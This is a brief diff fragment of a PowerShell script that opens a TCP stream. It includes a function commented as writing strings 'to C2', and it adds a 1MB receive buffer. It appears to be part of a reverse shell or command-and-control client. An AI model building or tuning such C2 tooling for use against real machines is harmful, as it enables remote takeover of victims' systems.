@@ -10,6 +10,7 @@ do {
 
 $NetworkStream = $TCPClient.GetStream()
 $StreamWriter = New-Object IO.StreamWriter($NetworkStream)
+$TCPClient.ReceiveBufferSize = 1048576  # 1MB
 
 # Writes a string to C2
 function WriteToStream ($String) {
